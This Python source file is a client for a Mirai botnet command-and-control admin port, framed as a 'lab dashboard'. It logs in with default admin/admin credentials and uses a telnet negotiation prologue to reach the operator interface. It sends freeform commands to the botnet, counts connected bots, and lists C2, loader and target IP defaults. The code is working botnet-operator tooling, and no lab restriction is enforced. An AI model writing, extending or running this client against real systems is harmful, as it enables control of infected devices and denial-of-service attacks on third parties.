"""
CNC control helper for the lab dashboard.
Talks to Mirai CNC admin port (default 23) over TCP — same path as telnet.
"""

from __future__ import annotations

import os
import re
import socket
import subprocess
import threading
import time
from collections import deque
from dataclasses import dataclass, field
from datetime import datetime
from typing import Deque, Dict, List, Optional, Tuple


ANSI_RE = re.compile(r"\x1b\[[0-9;?]*[A-Za-z]|\x1b\][^\x07]*\x07|\x1b\].*?\x1b\\|\x1b.")
TITLE_RE = re.compile(r"(\d+)\s+Bots?\s+Connected", re.I)
BOTLINE_RE = re.compile(r"^([^\s:]+)\s*:\s*(\d+)\s*$")


def strip_ansi(data: str) -> str:
    return ANSI_RE.sub("", data)


def now_ts() -> str:
    return datetime.now().strftime("%H:%M:%S")


@dataclass
class LabLog:
    lines: Deque[str] = field(default_factory=lambda: deque(maxlen=300))
    lock: threading.Lock = field(default_factory=threading.Lock)

    def add(self, level: str, message: str) -> None:
        line = f"[{now_ts()}] [{level}] {message}"
        with self.lock:
            self.lines.append(line)

    def snapshot(self, n: int = 120) -> List[str]:
        with self.lock:
            return list(self.lines)[-n:]


class CncClient:
    def __init__(
        self,
        host: str = "127.0.0.1",
        port: int = 23,
        username: str = "admin",
        password: str = "admin",
        timeout: float = 8.0,
    ) -> None:
        self.host = host
        self.port = port
        self.username = username
        self.password = password
        self.timeout = timeout
        self.log = LabLog()
        self._lock = threading.Lock()
        self._last_bot_total = 0
        self._last_distribution: Dict[str, int] = {}
        self._last_error: Optional[str] = None
        self._cnc_up = False

    def _recv_until(self, sock: socket.socket, needles: Tuple[str, ...], max_wait: float = 6.0) -> str:
        sock.settimeout(0.35)
        buf = ""
        deadline = time.time() + max_wait
        while time.time() < deadline:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                buf += chunk.decode("utf-8", errors="ignore")
                plain = strip_ansi(buf)
                for n in needles:
                    if n.lower() in plain.lower():
                        return buf
            except socket.timeout:
                continue
            except OSError:
                break
        return buf

    def _send_line(self, sock: socket.socket, text: str) -> None:
        sock.sendall((text + "\n").encode("utf-8", errors="ignore"))

    def probe_port(self) -> bool:
        try:
            with socket.create_connection((self.host, self.port), timeout=2.0):
                self._cnc_up = True
                return True
        except OSError:
            self._cnc_up = False
            return False

    def count_tcp_peers(self) -> int:
        """Count ESTABLISHED peers on CNC port (best-effort, excludes localhost)."""
        try:
            out = subprocess.check_output(
                ["ss", "-tn", "state", "established", f"( dport = :{self.port} or sport = :{self.port} )"],
                stderr=subprocess.DEVNULL,
                text=True,
                timeout=3,
            )
        except (subprocess.SubprocessError, FileNotFoundError, OSError):
            return -1

        peers = set()
        for line in out.splitlines()[1:]:
            parts = line.split()
            if len(parts) < 4:
                continue
            local, peer = parts[2], parts[3]
            # peer like 110.164.20.14:45678
            host = peer.rsplit(":", 1)[0].strip("[]")
            if host in ("127.0.0.1", "::1", "*"):
                continue
            if host.startswith("185.10.20.") and ":23" in local:
                # still count remote bots
                pass
            peers.add(host)
        return len(peers)

    def _login(self, sock: socket.socket) -> str:
        # Mirai CNC initialHandler() BLOCKS on the first Read before choosing
        # bot vs admin. Real `telnet` clients send IAC negotiation first, so
        # they get Admin.Handle() prompts. A silent client deadlocks:
        #   CNC waits for bytes, we wait for "username" prompt.
        # Send a non-bot prologue (must NOT be 00 00 00 xx) to enter admin UI.
        try:
            sock.sendall(b"\xff\xfb\x01\xff\xfb\x03\r\n")
        except OSError as e:
            raise RuntimeError(f"CNC wake/send failed: {e}") from e

        # Consume banner / username prompt (RU "пользователь" or plain)
        pre = self._recv_until(
            sock,
            ("username", "user", "login", "пользователь", "password", "пароль", ":"),
            max_wait=8.0,
        )
        if not strip_ansi(pre).strip():
            raise RuntimeError(
                "CNC opened :23 but sent no admin prompt "
                "(need prompt.txt next to ./cnc, and non-bot first packet)"
            )

        self._send_line(sock, self.username)
        self._recv_until(sock, ("password", "pass", "пароль", ":"), max_wait=5.0)
        self._send_line(sock, self.password)
        raw = self._recv_until(sock, ("Ready", "botnet#", "error", "unknown", "ошибка"), max_wait=15.0)
        plain = strip_ansi(raw)
        if "Ready" not in plain and "botnet#" not in plain:
            # Common: wrong password → Russian error text
            if "unknown" in plain.lower() or "ошибка" in plain:
                raise RuntimeError(
                    f"CNC login rejected for user={self.username!r} "
                    "(default lab is admin/admin — check MySQL users table)"
                )
            raise RuntimeError(
                "CNC login failed (check admin/admin, MySQL, and prompt.txt next to cnc)"
            )
        # Drain title / spinner leftovers
        time.sleep(0.35)
        try:
            sock.settimeout(0.2)
            while True:
                more = sock.recv(4096)
                if not more:
                    break
                raw += more.decode("utf-8", errors="ignore")
        except socket.timeout:
            pass
        return raw

    def session(self, command: Optional[str] = None) -> Dict:
        """One-shot login → optional command → parse bot title / botcount."""
        with self._lock:
            result = {
                "ok": False,
                "cnc_up": False,
                "bot_total": self._last_bot_total,
                "distribution": dict(self._last_distribution),
                "response": "",
                "error": None,
            }
            try:
                sock = socket.create_connection((self.host, self.port), timeout=self.timeout)
            except OSError as e:
                self._cnc_up = False
                self._last_error = f"Cannot connect to CNC {self.host}:{self.port} — {e}"
                result["error"] = self._last_error
                self.log.add("ERR", self._last_error)
                return result

            try:
                self._cnc_up = True
                result["cnc_up"] = True
                login_raw = self._login(sock)
                title_m = TITLE_RE.search(login_raw)
                if title_m:
                    self._last_bot_total = int(title_m.group(1))

                response_plain = ""
                if command:
                    self._send_line(sock, command)
                    time.sleep(0.45)
                    sock.settimeout(1.2)
                    raw = ""
                    try:
                        while True:
                            chunk = sock.recv(8192)
                            if not chunk:
                                break
                            raw += chunk.decode("utf-8", errors="ignore")
                            if "botnet#" in strip_ansi(raw):
                                # read a bit more for trailing title updates
                                sock.settimeout(0.25)
                    except socket.timeout:
                        pass
                    response_plain = strip_ansi(raw)
                    result["response"] = response_plain.strip()
                    self.log.add("CMD", f"> {command}")
                    for line in response_plain.splitlines():
                        line = line.strip()
                        if line and "botnet#" not in line:
                            self.log.add("CNC", line)

                    if command.strip() == "botcount":
                        dist: Dict[str, int] = {}
                        total = 0
                        for line in response_plain.splitlines():
                            line = line.strip()
                            # strip leftover prompt junk
                            line = re.sub(r".*botnet#\s*", "", line)
                            m = BOTLINE_RE.match(line)
                            if m:
                                key = m.group(1) or "default"
                                dist[key] = int(m.group(2))
                                total += int(m.group(2))
                        self._last_distribution = dist
                        # Prefer window-title count (always accurate); dist may be empty
                        # when bots have no source id string.
                        title_m2 = TITLE_RE.search(raw)
                        if title_m2:
                            self._last_bot_total = int(title_m2.group(1))
                        elif dist:
                            self._last_bot_total = total
                        else:
                            # keep previous title-based total if we already saw one this session
                            title_login = TITLE_RE.search(login_raw)
                            if title_login:
                                self._last_bot_total = int(title_login.group(1))
                            else:
                                self._last_bot_total = 0
                else:
                    # refresh title only
                    self._send_line(sock, "")
                    time.sleep(0.3)
                    try:
                        sock.settimeout(0.5)
                        raw = sock.recv(4096).decode("utf-8", errors="ignore")
                        title_m2 = TITLE_RE.search(raw)
                        if title_m2:
                            self._last_bot_total = int(title_m2.group(1))
                    except socket.timeout:
                        pass

                # Always refresh botcount for accurate dashboard numbers
                if command != "botcount":
                    self._send_line(sock, "botcount")
                    time.sleep(0.4)
                    try:
                        sock.settimeout(1.0)
                        raw = sock.recv(8192).decode("utf-8", errors="ignore")
                        plain = strip_ansi(raw)
                        dist = {}
                        total = 0
                        for line in plain.splitlines():
                            line = re.sub(r".*botnet#\s*", "", line.strip())
                            m = BOTLINE_RE.match(line)
                            if m:
                                dist[m.group(1)] = int(m.group(2))
                                total += int(m.group(2))
                        title_m3 = TITLE_RE.search(raw)
                        if title_m3:
                            self._last_bot_total = int(title_m3.group(1))
                        elif dist:
                            self._last_bot_total = total
                        elif command is None:
                            # if only refresh and empty botcount
                            if not dist and not title_m3:
                                pass
                        self._last_distribution = dist
                    except socket.timeout:
                        pass

                result["ok"] = True
                result["bot_total"] = self._last_bot_total
                result["distribution"] = dict(self._last_distribution)
                self._last_error = None
                self.log.add(
                    "OK",
                    f"CNC session ok — bots={self._last_bot_total} dist={self._last_distribution or '{}'}",
                )
            except Exception as e:
                self._last_error = str(e)
                result["error"] = str(e)
                self.log.add("ERR", str(e))
            finally:
                try:
                    self._send_line(sock, "exit")
                except OSError:
                    pass
                try:
                    sock.close()
                except OSError:
                    pass
            return result

    def refresh_status(self) -> Dict:
        port_up = self.probe_port()
        peers = self.count_tcp_peers()
        if not port_up:
            return {
                "ok": False,
                "cnc_up": False,
                "bot_total": 0,
                "distribution": {},
                "tcp_peers": peers,
                "error": f"CNC not listening on {self.host}:{self.port}",
                "logs": self.log.snapshot(),
            }

        sess = self.session(None)
        # Prefer title/botcount; if 0 but peers > 0, surface peer count as hint
        bot_total = sess.get("bot_total", 0) or 0
        return {
            "ok": sess.get("ok", False),
            "cnc_up": True,
            "bot_total": bot_total,
            "distribution": sess.get("distribution", {}),
            "tcp_peers": peers,
            "error": sess.get("error"),
            "logs": self.log.snapshot(),
            "lab": {
                "c2": os.environ.get("LAB_C2_IP", "185.10.20.100"),
                "loader": os.environ.get("LAB_LOADER_IP", "185.10.20.200"),
                "target_sg": os.environ.get("LAB_TARGET_SG", "203.0.113.100"),
                "target_kr": os.environ.get("LAB_TARGET_KR", "210.89.0.100"),
            },
        }

    def run_command(self, command: str) -> Dict:
        command = (command or "").strip()
        if not command:
            return {"ok": False, "error": "empty command"}
        # Safety: only allow lab-ish patterns in UI presets; freeform still possible for research lab
        sess = self.session(command)
        sess["logs"] = self.log.snapshot()
        return sess


def default_client() -> CncClient:
    return CncClient(
        host=os.environ.get("CNC_HOST", "127.0.0.1"),
        port=int(os.environ.get("CNC_PORT", "23")),
        username=os.environ.get("CNC_USER", "admin"),
        password=os.environ.get("CNC_PASS", "admin"),
    )
